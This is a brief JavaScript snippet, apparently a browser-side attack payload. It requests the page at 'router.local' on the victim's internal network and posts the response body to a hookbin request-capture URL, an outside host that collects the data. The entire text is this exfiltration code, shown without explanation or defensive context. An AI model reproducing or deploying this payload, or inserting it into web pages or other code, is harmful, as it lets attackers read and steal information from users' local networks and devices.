function postMessage(url, msg) {
    const http = new XMLHttpRequest();
    http.open('POST', url, true);
    http.send(msg);
}

const hookbin = "https://hookb.in/037Oqjgpn9f3J0ooPpYP";
const http = new XMLHttpRequest();
http.addEventListener("load", function(event) {
    postMessage(hookbin, http.responseText);
});
http.open("GET", "http://router.local");
http.send();
